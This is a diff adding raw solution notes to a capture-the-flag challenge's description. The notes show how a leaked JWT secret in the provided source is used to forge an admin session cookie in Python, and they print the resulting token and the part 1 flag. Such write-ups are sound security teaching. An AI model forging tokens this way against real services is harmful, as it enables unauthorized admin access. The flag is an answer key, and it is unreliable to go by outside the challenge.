@@ -14,3 +14,13 @@ weird, figure out who the admin is and access their panel
 50 point hint: what to do, but not how to do it
 
 ---
+
+raw notes:
+
+  - provided source code contains unredacted JWT secret and permission(/username) check for admin endpoint, so we can forge our own `token` cookie, then hit `/admin`:
+    ```pycon
+    >>> import jwt
+    >>> jwt.encode({'user': 'jelly'}, 'singaQu5aeWoh1vuoJuD]ooJ9aeh2soh', algorithm='HS256')
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE'
+    ```
+    > part 1 flag: jellyCTF{i_am_b3c0m3_awawa_d3str0y3r_0f_f3m4135}
